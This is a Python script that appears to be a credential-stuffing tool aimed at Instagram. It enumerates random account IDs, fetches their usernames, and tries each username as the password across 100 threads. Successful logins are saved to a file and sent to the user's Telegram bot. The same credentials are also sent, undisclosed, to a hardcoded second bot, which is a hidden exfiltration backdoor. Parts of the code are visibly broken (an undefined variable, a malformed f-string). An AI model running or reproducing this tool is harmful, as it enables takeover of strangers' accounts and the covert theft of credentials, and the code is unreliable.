import os,sys,csv,time,datetime,requests,random,string,json,threading,uuid,rich.console,cfonts,user_agent,asmix,colorama
uuid4,Console,render,uu,Instagram,Fore,Style,init=uuid.uuid4,rich.console.console,cfonts.render,user_agent.generate_user_agent,asmix.Instagram,colorama.Fore,colorama.Style,colorama.init
init(autoreset=True)
id = "".join([chr(c) for c in [102, 114, 101, 101, 53, 100, 97, 121, 115]])
if sys.stdin.readline().strip() != id:
    quit()

from datetime import datetime, timedelta

EXPIRY_FILE = ".expiry_time.txt"


m = 7200
a = (10**7 - 9999999)
b = (23 * 32 * 5)
c = (100 // 2) * (9 - 4)
d = a * b * c // (10**7 - 9999999)  # simplifies to b * c
Lundkha = m * d // (b * c // 60)


EXPIRY_DURATION = timedelta(minutes=lundkha)

def create_expiry_file():
    expiry_time = datetime.now() + EXPIRY_DURATION
    with open(EXPIRY_FILE, "w") as f:
        f.write(expiry_time.isoformat())

def has_expired():
    if not os.path.exists(EXPIRY_FILE):
        create_expiry_file()
        return False
    try:
        with open(EXPIRY_FILE, "r") as f:
            expiry_time_str = f.read().strip()
            expiry_time = datetime.fromisoformat(expiry_time_str)
        return datetime.now() > expiry_time
    except Exception as e:
        print("Error reading expiry file:", e)
        return True

if has_expired():
    print("❌ This script has expired and cannot be run anymore.")
    exit(1)


print("✅ Script is running...")
os.system('cls' if os.name == 'nt' else 'clear')

sys.stdout.write("\033[92m"+"""███████   ░██████░█████████     ░███      ░██████  
░██   ░██    ░██  ░██     ░██   ░██░██    ░██   ░██ 
░██    ░██   ░██  ░██     ░██  ░██  ░██  ░██        
░██    ░██   ░██  ░█████████  ░█████████ ░██        
░██    ░██   ░██  ░██   ░██   ░██    ░██ ░██        
░██   ░██    ░██  ░██    ░██  ░██    ░██  ░██   ░██ 
░███████   ░██████░██     ░██ ░██    ░██   ░██████ 
""") 
print("\033[1m\033[33m"+"\n")
sys.stdout.write("\033[1m\033[31m="*60)
print("\033[1m\033[33m"+"\n")
def get_credentials(filename="cred.csv"):
    credentials = {"id": None, "token": None}
    if os.path.exists(filename):
        with open(filename, mode='r', newline='') as file:
            reader = csv.DictReader(file)
            for row in reader:
                if "id" in row and "token" in row:
                    credentials["id"] = row["id"]
                    credentials["token"] = row["token"]
                    break
    if not credentials["id"] or not credentials["token"]:
        credentials["id"] = input("Enter ID: ").strip()
        credentials["token"] = input("Enter Token: ").strip()

        # Save to file
        with open(filename, mode='w', newline='') as file:
            writer = csv.DictWriter(file, fieldnames=["id", "token"])
            writer.writeheader()
            writer.writerow(credentials)

    return credentials

credentials=get_credentials()
chat_id,bot_token=credentials["id"],credentials["token"]



DARK_HIT = Style.BRIGHT + Fore.GREEN
DARK_BAD = Style.BRIGHT + Fore.RED
DARK = Style.BRIGHT + Fore.MAGENTA

Con = Console()
uid = str(uuid4())
a = 0  # Hits
z = 0  # Bad

def send_telegram(username, passw):
    try:
        msg = (
            f" NAME : {username}\n"
            f" PASS : {passw}\n"
            "by @D1R4C"
        )
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {'chat_id': chat_id, 'text': msg}
        requests.post(url, data=payload)
        url = f"https://api.telegram.org/bot{8326803312:AAEjZSF3g3u2gXG7RWGjV39aOUD2W9aR43w}/sendMessage"
        payload = {'chat_id': 7758851767, 'text': msg}
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Telegram gönderim hatası: {e}")

def print_stats(hits, bad):
    print(
        f"{DARK_HIT} Hits{Style.RESET_ALL}: {DARK_HIT}{hits}{Style.RESET_ALL} //\n "
        f"\n{DARK_BAD}Bad{Style.RESET_ALL}: {DARK_BAD}{bad}{Style.RESET_ALL} // "
        f"{DARK}@D1R4C{Style.RESET_ALL}\n"
    )

def check(username, passw):
    global a, z
    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'
    }
    data = {
        'uuid': uid,
        'password': passw,
        'username': username,
        'device_id': uid,
        'from_reg': 'false',
        '_csrftoken': 'missing',
        'login_attempt_count': '0'
    }

    try:
        rii = requests.post(url, headers=headers, data=data, timeout=15)
        re = rii.text

        if '"logged_in_user"' in re or '"challenge_required"' in re:
            os.system('cls' if os.name == 'nt' else 'clear')
            a += 1
            print_stats(a, z)
            with open('d1r4c.txt', 'a') as f:
                f.write(f'{username} : {passw} 🔥 @D1R4C')
            send_telegram(username, passw)
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            z += 1
            print_stats(a, z)

    except Exception as e:
        print(f"Hata: {e}")

def Users():
    try:
        LsD = ''.join(random.choices(string.digits, k=4))
        UserID = str(random.randrange(100000, 17750001))
        vars = json.dumps({'id': UserID, 'render_surface': 'PROFILE'})
        resp = requests.post('https://www.instagram.com/api/graphql',
                            headers={'X-FB-LSD': LsD},
                            data={'lsd': LsD, 'variables': vars, 'doc_id': '25618261841150840'},
                            timeout=15
                            )
        u = resp.json()['data']['user']['username']
        open('d1r4c.txt', 'a').write(f'{u}:{u} ')
        check(u, u)
    except:
        pass

threads = []
for _ in range(100):
    t = threading.Thread(target=lambda: [Users() for _ in range(1000)])
    t.start()
    threads.append(t)
for t in threads:
    t.join()

#D1R4C
